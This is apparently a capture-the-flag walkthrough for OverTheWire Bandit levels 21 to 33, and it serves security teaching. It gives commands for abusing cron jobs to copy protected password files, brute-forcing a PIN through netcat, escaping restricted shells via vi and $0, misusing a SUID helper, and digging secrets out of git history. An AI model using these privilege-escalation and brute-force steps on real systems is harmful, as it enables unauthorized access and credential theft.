    Level 21

    Objective

    Inspect the cron job configuration to determine where the password for the next level is being written.

    Solution

    List the cron jobs:

    ls /etc/cron.d

    Inspect the relevant cron job:

    cat /etc/cron.d/cronjob_bandit22

    Read the script executed by cron:

    cat /usr/bin/cronjob_bandit22.sh

    Locate and read the output file:

    ls -l /tmp
cat /tmp/bandit22_pass

    Explanation

    The cron scheduler executes cronjob_bandit22.sh every minute as bandit22.

    The script reads:

    /etc/bandit_pass/bandit22

    and writes its contents into a file inside /tmp, making it accessible to other users. Reading that file reveals the password.

    Level 22

    Objective

    Determine the filename generated by the cron job and retrieve the password written to it.

    Solution

    Inspect the cron configuration:

    cat /etc/cron.d/cronjob_bandit23

    Read the script:

    cat /usr/bin/cronjob_bandit23.sh

    Generate the filename exactly as the script does:

    hash=$(echo "I am user bandit23" | md5sum | cut -d' ' -f1)

    Remove any conflicting file:

    rm -f /tmp/"$hash"

    Wait for cron to execute:

    sleep 65

    Read the generated file:

    cat /tmp/"$hash"

    Explanation

    The cron job runs as bandit23 every minute.

    The script calculates an MD5 hash of the string:

    I am user bandit23

    and uses it as the filename inside /tmp.

    After cron executes, the generated file contains the password for the next level.

    Level 23

    Objective

    Exploit the cron job that executes scripts placed inside /var/spool/bandit24/foo.

    Solution

    Create a temporary working directory:

    cd /tmp
mkdir exploit23
cd exploit23

    Create the payload:

    nano myscript.sh

    Contents:

    #!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24pass

    Make it executable:

    chmod +x myscript.sh

    Copy it into the cron directory:

    cp myscript.sh /var/spool/bandit24/foo/

    Wait for cron:

    sleep 65

    Read the password:

    cat /tmp/b24pass

    Explanation

    Every minute, the cron service running as bandit24 executes every script found inside:

    /var/spool/bandit24/foo/

    By placing a custom script there, it executes with bandit24 privileges and copies the protected password into /tmp, where it can be read before the script is automatically deleted.

    Level 24

    Objective

    Brute-force the 4-digit PIN required by the service listening on port 30002.

    Solution

    pass=$(cat /etc/bandit_pass/bandit24); \
for pin in $(seq -w 0000 9999); do \
echo "$pass $pin"; \
done | nc localhost 30002

    Explanation

    The daemon expects a single line containing:

    <password> <4-digit-pin>

    Using seq -w generates every possible PIN from 0000 to 9999.

    All attempts are sent through one persistent Netcat connection, allowing the daemon to validate each PIN until the correct combination is found. Once successful, it returns the password for the next level.

    Level 25

    Objective

    Escape the restricted login shell used by bandit26.

    Solution

    Determine the login shell:

    grep bandit26 /etc/passwd

    Log in using the provided private key:

    ssh -p 2220 -i bandit26.sshkey bandit26@bandit.labs.overthewire.org

    Inside vi, spawn a shell:

    :set shell=/bin/bash
:shell

    Alternative:

    :! /bin/bash

    Read the password:

    cat /etc/bandit_pass/bandit26

    Explanation

    Instead of using /bin/bash, the account launches the showtext program, which opens vi.

    Although this creates a restricted environment, vi supports shell escapes, allowing a normal Bash shell to be spawned and the password file to be accessed.

    Level 26

    Objective

    Use the provided SUID binary to retrieve the password for bandit27.

    Solution

    Inspect the directory:

    ls -l

    Execute the SUID helper:

    ./bandit27-do cat /etc/bandit_pass/bandit27

    Explanation

    The bandit27-do binary has the setuid bit enabled, causing it to execute with the privileges of bandit27.

    By supplying cat /etc/bandit_pass/bandit27 as its argument, the binary reads the protected password file and prints the password for the next level.

    Level 27

    Objective

    Clone a remote Git repository over SSH and retrieve the password for bandit28.

    Solution

    Clone the repository:

    git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo

    Enter the repository:

    cd repo

    List its contents:

    ls -la

    Read the password:

    cat README

    Explanation

    The repository is accessible over SSH using the current Bandit credentials.

    Once cloned, the password is stored directly inside the README file.

    Level 28

    Objective

    Recover the password from the Git commit history.

    Solution

    Clone the repository:

    git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
cd repo

    Inspect the current README:

    cat README.md

    View the commit history:

    git log

    Inspect previous commits:

    git show <commit_hash>

    Example:

    git show d0cf2ab7

    Explanation

    Although the password has been removed from the latest version of the repository, Git preserves every commit.

    Inspecting earlier commits reveals the password before it was removed, demonstrating how secrets can remain accessible even after being deleted from the latest revision.

    Level 29

    Objective

    Find the password stored in a non-default Git branch.

    Solution

    Clone the repository:

    git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
cd repo

    List all branches:

    git branch -a

    Switch to the development branch:

    git checkout dev

    Inspect the repository:

    ls
cat README.md

    Explanation

    The default branch does not contain the password.

    Enumerating remote branches reveals a development branch where sensitive information was accidentally committed. Reading the README.md on that branch reveals the next password.

    Level 30

    Objective

    Retrieve the password stored as a Git tag.

    Solution

    Clone the repository:

    git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo
cd repo

    List all tags:

    git tag

    Inspect the tag:

    git show secret

    Explanation

    Unlike previous levels, the password is not stored in the working tree, commit history, or branches.

    Instead, it is stored inside a Git tag named secret, demonstrating that Git objects other than commits may also contain sensitive information.

    Level 31

    Objective

    Push a required file to the remote Git repository.

    Solution

    Clone the repository:

    git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo
cd repo

    Read the instructions:

    cat README.md

    Create the required file:

    echo "May I come in?" > key.txt

    Inspect .gitignore:

    cat .gitignore

    Force-add the file:

    git add -f key.txt

    Commit the changes:

    git commit -m "add key"

    Push to the remote repository:

    git push origin master

    Explanation

    The repository ignores every file through .gitignore.

    Using git add -f overrides this restriction, allowing key.txt to be committed and pushed.

    A server-side Git hook validates the submission and prints the password for the next level after a successful push.

    Level 32

    Objective

    Escape the restricted uppercase shell and retrieve the final password.

    Solution

    Spawn a normal shell:

    $0

    Verify the current user:

    whoami

    Read the password:

    cat /etc/bandit_pass/bandit33

    Explanation

    The custom shell converts all typed commands to uppercase, preventing normal command execution.

    However, shell variable expansion occurs after this transformation. The variable $0 expands to the current shell (sh), allowing a normal interactive shell to be spawned and bypassing the restriction.

    Level 33

    Objective

    Complete the Bandit wargame.

    Solution

    View the final message:

    ls
cat README.txt

    Explanation

    There are no additional levels after Bandit 33.

    The README.txt file congratulates you on completing the Bandit wargame and encourages exploring the remaining OverTheWire challenges.
